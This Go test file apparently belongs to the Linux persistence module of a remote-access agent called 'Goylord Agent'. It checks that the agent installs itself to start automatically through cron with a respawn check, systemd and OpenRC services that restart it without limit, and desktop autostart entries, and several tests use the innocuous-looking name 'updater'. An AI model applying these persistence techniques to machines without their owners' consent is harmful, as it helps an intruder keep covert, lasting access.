//go:build linux
// +build linux

package persistence

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func withLinuxTempHome(t *testing.T) string {
	t.Helper()

	home := t.TempDir()
	origHome := currentUserHomeDir
	origStartupName := DefaultStartupName
	origActivate := activateLinuxPersistence
	origEUID := currentEUID
	currentUserHomeDir = func() (string, error) { return home, nil }
	DefaultStartupName = ""
	activateLinuxPersistence = false
	currentEUID = func() int { return 1000 }

	t.Cleanup(func() {
		currentUserHomeDir = origHome
		DefaultStartupName = origStartupName
		activateLinuxPersistence = origActivate
		currentEUID = origEUID
	})

	return home
}

func TestLinuxCronFallbackReplacesExistingMarkedEntry(t *testing.T) {
	_ = withLinuxTempHome(t)
	DefaultStartupName = "updater"

	existing := strings.Join([]string{
		"SHELL=/bin/sh",
		cronMarker(),
		"* * * * * /old",
		"0 0 * * * /keep",
		"",
	}, "\n")

	got := withoutCronFallback(existing)
	if strings.Contains(got, "/old") || strings.Contains(got, cronMarker()) {
		t.Fatalf("withoutCronFallback kept marked entry:\n%s", got)
	}
	if !strings.Contains(got, "SHELL=/bin/sh") || !strings.Contains(got, "0 0 * * * /keep") {
		t.Fatalf("withoutCronFallback removed unrelated crontab lines:\n%s", got)
	}
}

func TestLinuxCronCommandQuotesExecutablePath(t *testing.T) {
	_ = withLinuxTempHome(t)

	cmd := cronCommand("/tmp/over lord/agent's bin")
	if !strings.Contains(cmd, "pgrep -u \"$USER\" -fx '/tmp/over lord/agent'\"'\"'s bin'") {
		t.Fatalf("cron command did not shell-quote pgrep path correctly:\n%s", cmd)
	}
	if !strings.Contains(cmd, "|| '/tmp/over lord/agent'\"'\"'s bin'") {
		t.Fatalf("cron command did not shell-quote exec path correctly:\n%s", cmd)
	}
}

func TestLinuxInstallOpenRCCreatesUserService(t *testing.T) {
	home := withLinuxTempHome(t)
	DefaultStartupName = "updater"
	exePath := filepath.Join(home, "bin", "existing agent")

	if err := installOpenRC(exePath); err != nil {
		t.Fatalf("installOpenRC() error: %v", err)
	}

	servicePath := filepath.Join(home, ".config", "openrc", "init.d", "updater")
	serviceBytes, err := os.ReadFile(servicePath)
	if err != nil {
		t.Fatalf("read OpenRC service: %v", err)
	}
	service := string(serviceBytes)
	for _, want := range []string{
		"#!/sbin/openrc-run",
		"description=\"Goylord Agent\"",
		"command='" + exePath + "'",
		"command_background=true",
		"respawn_delay=10",
		"respawn_max=0",
	} {
		if !strings.Contains(service, want) {
			t.Fatalf("OpenRC service missing %q:\n%s", want, service)
		}
	}
	if info, err := os.Stat(servicePath); err != nil {
		t.Fatalf("stat OpenRC service: %v", err)
	} else if info.Mode().Perm() != 0755 {
		t.Fatalf("OpenRC service mode = %o, want 0755", info.Mode().Perm())
	}
}

func TestLinuxOpenRCPathUsesSystemInitWhenRoot(t *testing.T) {
	_ = withLinuxTempHome(t)
	currentEUID = func() int { return 0 }
	DefaultStartupName = "updater"

	got, err := getOpenRCPath()
	if err != nil {
		t.Fatalf("getOpenRCPath() error: %v", err)
	}
	want := filepath.Join(string(filepath.Separator), "etc", "init.d", "updater")
	if got != want {
		t.Fatalf("getOpenRCPath() = %q, want %q", got, want)
	}
}

func TestLinuxOpenRCServiceNameSanitizesCustomName(t *testing.T) {
	_ = withLinuxTempHome(t)
	DefaultStartupName = "../bad name"

	if got := openRCServiceName(); got != "bad_name" {
		t.Fatalf("openRCServiceName() = %q, want %q", got, "bad_name")
	}
}

func writeLinuxSourceExecutable(t *testing.T) string {
	t.Helper()

	src := filepath.Join(t.TempDir(), "source-agent")
	if err := os.WriteFile(src, []byte("agent-bytes"), 0644); err != nil {
		t.Fatalf("write source executable: %v", err)
	}
	return src
}

func TestLinuxInstallCreatesSystemdServiceAndExecutable(t *testing.T) {
	home := withLinuxTempHome(t)
	src := writeLinuxSourceExecutable(t)

	if err := InstallFrom(src); err != nil {
		t.Fatalf("InstallFrom() error: %v", err)
	}

	target := filepath.Join(home, ".local", "share", "goylord", "agent")
	gotBytes, err := os.ReadFile(target)
	if err != nil {
		t.Fatalf("read installed executable: %v", err)
	}
	if string(gotBytes) != "agent-bytes" {
		t.Fatalf("installed executable content mismatch: %q", string(gotBytes))
	}
	if info, err := os.Stat(target); err != nil {
		t.Fatalf("stat installed executable: %v", err)
	} else if info.Mode().Perm() != 0755 {
		t.Fatalf("installed executable mode = %o, want 0755", info.Mode().Perm())
	}

	servicePath := filepath.Join(home, ".config", "systemd", "user", "agent.service")
	serviceBytes, err := os.ReadFile(servicePath)
	if err != nil {
		t.Fatalf("read systemd service: %v", err)
	}
	service := string(serviceBytes)
	for _, want := range []string{
		"Description=Goylord Agent",
		"ExecStart=" + target,
		"Restart=always",
		"WantedBy=default.target",
	} {
		if !strings.Contains(service, want) {
			t.Fatalf("systemd service missing %q:\n%s", want, service)
		}
	}

	autostartPath := filepath.Join(home, ".config", "autostart", "agent.desktop")
	if _, err := os.Stat(autostartPath); !os.IsNotExist(err) {
		t.Fatalf("default install should prefer systemd and not write desktop entry, stat err=%v", err)
	}
}

func TestLinuxConfigureCreatesSystemdServiceForExistingPath(t *testing.T) {
	home := withLinuxTempHome(t)
	exePath := filepath.Join(home, "bin", "existing-agent")

	if err := Configure(exePath); err != nil {
		t.Fatalf("Configure() error: %v", err)
	}

	servicePath := filepath.Join(home, ".config", "systemd", "user", "agent.service")
	serviceBytes, err := os.ReadFile(servicePath)
	if err != nil {
		t.Fatalf("read systemd service: %v", err)
	}
	if service := string(serviceBytes); !strings.Contains(service, "ExecStart="+exePath) {
		t.Fatalf("systemd service missing executable path %q:\n%s", exePath, service)
	}
}

func TestLinuxInstallAutostartCreatesDesktopEntry(t *testing.T) {
	home := withLinuxTempHome(t)
	exePath := filepath.Join(home, "bin", "existing-agent")

	if err := installAutostart(exePath); err != nil {
		t.Fatalf("installAutostart() error: %v", err)
	}

	desktopPath := filepath.Join(home, ".config", "autostart", "agent.desktop")
	desktopBytes, err := os.ReadFile(desktopPath)
	if err != nil {
		t.Fatalf("read desktop entry: %v", err)
	}
	desktop := string(desktopBytes)
	for _, want := range []string{
		"[Desktop Entry]",
		"Type=Application",
		"Exec=" + exePath,
		"X-GNOME-Autostart-enabled=true",
	} {
		if !strings.Contains(desktop, want) {
			t.Fatalf("desktop entry missing %q:\n%s", want, desktop)
		}
	}
}

func TestLinuxCustomStartupNameChangesServiceAndBinaryNames(t *testing.T) {
	home := withLinuxTempHome(t)
	DefaultStartupName = "updater"

	if err := InstallFrom(writeLinuxSourceExecutable(t)); err != nil {
		t.Fatalf("InstallFrom() error: %v", err)
	}

	target := filepath.Join(home, ".local", "share", "goylord", "updater")
	if _, err := os.Stat(target); err != nil {
		t.Fatalf("stat custom executable: %v", err)
	}

	servicePath := filepath.Join(home, ".config", "systemd", "user", "updater.service")
	serviceBytes, err := os.ReadFile(servicePath)
	if err != nil {
		t.Fatalf("read custom systemd service: %v", err)
	}
	if service := string(serviceBytes); !strings.Contains(service, "ExecStart="+target) {
		t.Fatalf("custom systemd service missing target %q:\n%s", target, service)
	}
}

func TestLinuxUninstallRemovesStartupFilesAndExecutable(t *testing.T) {
	home := withLinuxTempHome(t)

	target := filepath.Join(home, ".local", "share", "goylord", "agent")
	servicePath := filepath.Join(home, ".config", "systemd", "user", "agent.service")
	desktopPath := filepath.Join(home, ".config", "autostart", "agent.desktop")
	openRCPath := filepath.Join(home, ".config", "openrc", "init.d", "agent")
	for _, path := range []string{target, servicePath, desktopPath, openRCPath} {
		if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
			t.Fatalf("mkdir %q: %v", filepath.Dir(path), err)
		}
		if err := os.WriteFile(path, []byte("x"), 0644); err != nil {
			t.Fatalf("write %q: %v", path, err)
		}
	}

	if err := Remove(); err != nil {
		t.Fatalf("Remove() error: %v", err)
	}
	for _, path := range []string{target, servicePath, desktopPath, openRCPath} {
		if _, err := os.Stat(path); !os.IsNotExist(err) {
			t.Fatalf("expected %q to be removed, stat err=%v", path, err)
		}
	}
}

func TestLinuxReplaceExecutablePreservesExecutableModeWhenTargetExists(t *testing.T) {
	_ = withLinuxTempHome(t)
	src := writeLinuxSourceExecutable(t)
	target := filepath.Join(t.TempDir(), "agent")

	if err := os.WriteFile(target, []byte("old"), 0644); err != nil {
		t.Fatalf("write existing target: %v", err)
	}
	if err := replaceExecutable(src, target); err != nil {
		t.Fatalf("replaceExecutable() error: %v", err)
	}
	if info, err := os.Stat(target); err != nil {
		t.Fatalf("stat replaced executable: %v", err)
	} else if info.Mode().Perm() != 0755 {
		t.Fatalf("replaced executable mode = %o, want 0755", info.Mode().Perm())
	}
}
